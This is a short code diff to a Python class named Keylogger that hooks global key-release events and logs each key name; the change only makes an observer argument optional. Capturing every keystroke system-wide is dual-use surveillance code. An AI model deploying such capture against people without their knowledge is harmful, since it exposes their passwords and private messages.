@@ -4,7 +4,7 @@ from utils.logging_config import log
 
 class Keylogger:
 
-    def __init__(self, observer):
+    def __init__(self, observer=None):
         self.observer = observer
 
     def callback(self, event):
@@ -25,7 +25,8 @@ class Keylogger:
                 name = name.replace(" ", "_")
                 name = f"[{name.upper()}]"
         log.debug(name)
-        self.observer.filter(name)
+        if not self.observer == None:
+            self.observer.filter(name)
 
     def start(self):
         keyboard.on_release(callback=self.callback)
